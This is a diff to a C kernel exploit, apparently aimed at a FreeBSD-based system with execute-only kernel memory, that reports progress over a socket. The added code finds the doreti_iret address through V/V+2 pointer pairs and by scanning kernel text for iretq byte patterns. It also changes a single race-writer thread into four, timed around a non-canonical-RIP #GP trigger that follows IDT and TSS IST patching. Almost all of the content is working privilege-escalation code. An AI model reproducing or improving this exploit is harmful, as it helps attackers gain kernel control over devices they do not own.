@@ -4253,8 +4253,9 @@ broad_done:
         struct sigaction old_sigbus_act;
         int sigsegv_installed = 0;
         struct sigaction old_sigsegv_act;
-        int writer_started = 0;
-        thrd_t writer_thread;
+        #define NUM_GP_WRITERS 4
+        int writers_started = 0;
+        thrd_t writer_threads[NUM_GP_WRITERS];
         stack_t old_sigalt;
         int had_old_sigalt = 0;
 
@@ -5003,6 +5004,59 @@ broad_done:
                     goto classify;
                 }
 
+                /* Check for V, V+2 pairs even without DMAP verification.
+                 * doreti_iret is iretq (2 bytes: 0x48 0xcf), so
+                 * doreti_iret_fault = doreti_iret + 2.  FreeBSD's
+                 * trap.c references both.  Finding both V and V+2 in
+                 * .data is very strong evidence — no .text read needed. */
+                {
+                    uint64_t pair_va = 0;
+                    int pair_i = -1;
+                    for (int i = 0; i < num_near_ptrs && !pair_va; i++) {
+                        uint64_t v = near_ptrs[i].text_va;
+                        for (int j = 0; j < num_near_ptrs; j++) {
+                            if (near_ptrs[j].text_va == v + 2) {
+                                pair_va = v;
+                                pair_i = i;
+                                break;
+                            }
+                        }
+                    }
+
+                    if (pair_va != 0) {
+                        uint64_t koff = pair_va - (uint64_t)ktext_base;
+                        send_response(sock,
+                            "\n  *** V/V+2 PAIR FOUND ***\n"
+                            "  doreti_iret      = 0x%lx (ktext+0x%lx)\n"
+                            "  doreti_iret_fault = 0x%lx (ktext+0x%lx)\n",
+                            pair_va, koff,
+                            pair_va + 2, koff + 2);
+                        send_response(sock,
+                            "  Found at kdata+0x%lx (dist=%+ld)\n",
+                            near_ptrs[pair_i].data_addr -
+                                (uint64_t)KERNEL_ADDRESS_DATA_BASE,
+                            (long)near_ptrs[pair_i].dist);
+                        send_response(sock,
+                            "Confidence: HIGH (V/V+2 pair in .data, "
+                            "zero kernel writes)\n");
+
+                        if (num_candidates < MAX_DORETI_CANDIDATES) {
+                            candidates[num_candidates].paddr =
+                                have_text_pa ? text_pa + koff : 0;
+                            candidates[num_candidates].ktext_offset = koff;
+                            candidates[num_candidates].has_swapgs_before = 1;
+                            candidates[num_candidates].near_handler = 13;
+                            candidates[num_candidates].page_dist = 0;
+                            num_candidates++;
+                        }
+                        goto classify;
+                    }
+
+                    send_response(sock,
+                        "  No V/V+2 pair found among %d pointers\n",
+                        num_near_ptrs);
+                }
+
                 /* Even if DMAP verify failed, report unverified pointers */
                 if (num_near_ptrs > 0) {
                     send_response(sock,
@@ -5025,6 +5079,152 @@ broad_done:
                 }
             }
             #undef MAX_NEAR_PTRS
+        }
+
+        /* ---- Strategy C: Try reading .text via kernel VA directly ----
+         *
+         * DMAP reads failed (XOM via EPT), but kernel_copyout uses the
+         * kernel's own page tables which may map .text as R+X.  The
+         * DMAP mapping and the kernel text mapping go through different
+         * page table entries, so different permissions are possible.
+         */
+        if (gp_handler_va != 0) {
+            send_response(sock, "\n7b+. Strategy C: kernel VA text "
+                          "read test...\n");
+
+            uint8_t test_byte;
+            int test_rc = kernel_copyout(gp_handler_va, &test_byte, 1);
+            send_response(sock, "  kernel_copyout(0x%lx) rc=%d\n",
+                          gp_handler_va, test_rc);
+
+            if (test_rc == 0) {
+                /* Kernel .text is readable via kernel VA! Scan +-8KB */
+                send_response(sock, "  .text readable via kernel VA! "
+                              "Scanning +-8KB for iretq...\n");
+
+                uint64_t scan_start = (gp_handler_va > 0x2000) ?
+                    (gp_handler_va - 0x2000) & ~0xFFFULL :
+                    gp_handler_va & ~0xFFFULL;
+                uint64_t scan_end = (gp_handler_va + 0x2000 + 0xFFF) &
+                                    ~0xFFFULL;
+                uint8_t sc_buf[4096];
+
+                uint64_t best_iretq_va = 0;
+                int best_confidence = 0;
+                int iretq_count = 0;
+
+                for (uint64_t va = scan_start; va < scan_end;
+                     va += 0x1000) {
+                    if (kernel_copyout(va, sc_buf, sizeof(sc_buf)) != 0) {
+                        send_response(sock, "  page VA=0x%lx: "
+                                      "unreadable\n", va);
+                        continue;
+                    }
+
+                    for (size_t i = 0; i + 1 < sizeof(sc_buf); i++) {
+                        if (sc_buf[i] != 0x48 || sc_buf[i+1] != 0xcf)
+                            continue;
+
+                        uint64_t cand_va = va + i;
+                        int confidence = 0;
+                        iretq_count++;
+
+                        /* cli (0xfa) within 40 bytes before */
+                        size_t cli_s = (i >= 40) ? i - 40 : 0;
+                        int has_cli = 0;
+                        for (size_t j = cli_s; j < i; j++) {
+                            if (sc_buf[j] == 0xfa) {
+                                has_cli = 1;
+                                confidence += 2;
+                                break;
+                            }
+                        }
+
+                        /* swapgs (0x0f 0x01 0xf8) within 32 bytes */
+                        size_t sg_s = (i >= 32) ? i - 32 : 0;
+                        int has_swapgs = 0;
+                        for (size_t j = sg_s; j + 2 < i; j++) {
+                            if (sc_buf[j] == 0x0f &&
+                                sc_buf[j+1] == 0x01 &&
+                                sc_buf[j+2] == 0xf8) {
+                                has_swapgs = 1;
+                                confidence += 3;
+                                break;
+                            }
+                        }
+
+                        /* subq $imm,%rsp after iretq */
+                        int has_subq = 0;
+                        if (i + 2 + 16 <= sizeof(sc_buf)) {
+                            for (size_t j = i + 2;
+                                 j < i + 2 + 16 &&
+                                 j + 2 < sizeof(sc_buf); j++) {
+                                if (sc_buf[j] == 0x48 &&
+                                    (sc_buf[j+1] == 0x83 ||
+                                     sc_buf[j+1] == 0x81) &&
+                                    sc_buf[j+2] == 0xec) {
+                                    has_subq = 1;
+                                    confidence += 3;
+                                    break;
+                                }
+                            }
+                        }
+
+                        /* proximity to handler */
+                        int64_t dist = (int64_t)(cand_va - gp_handler_va);
+                        if (dist < 0 && dist > -0x1000)
+                            confidence += 2;
+                        else if (dist >= 0 && dist < 0x1000)
+                            confidence += 1;
+
+                        send_response(sock,
+                            "  iretq at 0x%lx (ktext+0x%lx, dist=%+ld)"
+                            " cli=%d sg=%d subq=%d conf=%d\n",
+                            cand_va,
+                            cand_va - (uint64_t)ktext_base,
+                            (long)dist, has_cli, has_swapgs,
+                            has_subq, confidence);
+
+                        if (confidence > best_confidence) {
+                            best_confidence = confidence;
+                            best_iretq_va = cand_va;
+                        }
+                    }
+                }
+
+                send_response(sock, "  Found %d iretq in +-8KB\n",
+                              iretq_count);
+
+                if (best_iretq_va != 0 && best_confidence >= 3) {
+                    uint64_t koff = best_iretq_va - (uint64_t)ktext_base;
+                    send_response(sock,
+                        "\n*** doreti_iret = 0x%lx (ktext+0x%lx) ***\n",
+                        best_iretq_va, koff);
+                    send_response(sock,
+                        "Confidence: %s (kernel VA text scan, "
+                        "score=%d)\n",
+                        best_confidence >= 5 ? "HIGH" : "MEDIUM",
+                        best_confidence);
+                    send_response(sock,
+                        "  Found via Strategy C — zero kernel writes\n");
+
+                    if (num_candidates < MAX_DORETI_CANDIDATES) {
+                        candidates[num_candidates].paddr =
+                            have_text_pa ?
+                            text_pa + koff : 0;
+                        candidates[num_candidates].ktext_offset = koff;
+                        candidates[num_candidates].has_swapgs_before =
+                            (best_confidence >= 5) ? 1 : 0;
+                        candidates[num_candidates].near_handler = 13;
+                        candidates[num_candidates].page_dist = 0;
+                        num_candidates++;
+                    }
+                    goto classify;
+                }
+            } else {
+                send_response(sock, "  .text is XOM via kernel VA too — "
+                              "Strategy C failed\n");
+            }
         }
 
         /* 7c. Allocate IST page */
@@ -5591,12 +5791,19 @@ broad_done:
             send_response(sock, "  #SS gate IST -> 7\n");
         }
 
-        /* Step 3: Start writer thread NOW — right before trigger */
-        send_response(sock, "  Starting writer thread...\n");
-        if (thrd_create(&writer_thread, gp_trap_writer_fn, ist_page) == thrd_success) {
-            writer_started = 1;
-        } else {
-            send_response(sock, "  thrd_create failed — aborting\n");
+        /* Step 3: Start writer threads — multiple for better race odds */
+        send_response(sock, "  Starting %d writer threads...\n",
+                      NUM_GP_WRITERS);
+        for (int w = 0; w < NUM_GP_WRITERS; w++) {
+            if (thrd_create(&writer_threads[w], gp_trap_writer_fn,
+                            ist_page) == thrd_success) {
+                writers_started++;
+            }
+        }
+        send_response(sock, "  %d/%d writer threads started\n",
+                      writers_started, NUM_GP_WRITERS);
+        if (writers_started == 0) {
+            send_response(sock, "  No writers started — aborting\n");
             /* Restore patches before cleanup */
             if (idt_gate_modified) {
                 kernel_setchar(idt_access + 13 * 16 + 4, idt_gate_saved[4]);
@@ -5730,10 +5937,13 @@ broad_done:
                         "  attempt %d (non-canonical RIP)...\n",
                         (int)gp_trap_attempt_count);
 
-                    /* Activate writer just before trigger —
-                     * minimizes window where it can corrupt
-                     * unrelated exception trap frames. */
+                    /* Activate writers with brief delay so all
+                     * threads enter their tight write loops before
+                     * the trigger fires.  Without this the single
+                     * volatile-flag check may not propagate to all
+                     * CPUs in time. */
                     gp_trap_writer_active = 1;
+                    usleep(500); /* 500µs for writers to spin up */
 
                     setcontext((ucontext_t *)uc_buf);
 
@@ -5759,12 +5969,14 @@ broad_done:
             }
         }
 
-        /* Stop writer thread FIRST — it's a tight spin loop */
+        /* Stop writer threads FIRST — they're tight spin loops */
         gp_trap_stop_writer = 1;
-        if (writer_started) {
-            thrd_join(writer_thread, NULL);
-            writer_started = 0;
-            send_response(sock, "  Writer thread stopped\n");
+        if (writers_started > 0) {
+            for (int w = 0; w < writers_started; w++)
+                thrd_join(writer_threads[w], NULL);
+            send_response(sock, "  %d writer threads stopped\n",
+                          writers_started);
+            writers_started = 0;
         }
 
         /* Immediately restore IDT/TSS patches — every microsecond
@@ -5829,11 +6041,12 @@ broad_done:
                     "  Phase 7c will redirect #DB to singlestep "
                     "through this instruction\n");
 
-                /* Stop writer before cleanup */
+                /* Stop writers before cleanup */
                 gp_trap_stop_writer = 1;
-                if (writer_started) {
-                    thrd_join(writer_thread, NULL);
-                    writer_started = 0;
+                if (writers_started > 0) {
+                    for (int w = 0; w < writers_started; w++)
+                        thrd_join(writer_threads[w], NULL);
+                    writers_started = 0;
                 }
 
                 /* IDT/TSS already restored after trigger loop */
@@ -5916,11 +6129,12 @@ broad_done:
         /* Clear IST page pointer so signal handler won't read stale data */
         gp_trap_ist_page_ptr = NULL;
 
-        /* Stop writer thread */
+        /* Stop writer threads */
         gp_trap_stop_writer = 1;
-        if (writer_started) {
-            thrd_join(writer_thread, NULL);
-            writer_started = 0;
+        if (writers_started > 0) {
+            for (int w = 0; w < writers_started; w++)
+                thrd_join(writer_threads[w], NULL);
+            writers_started = 0;
         }
 
         /* Restore per-CPU TSS IST entries */
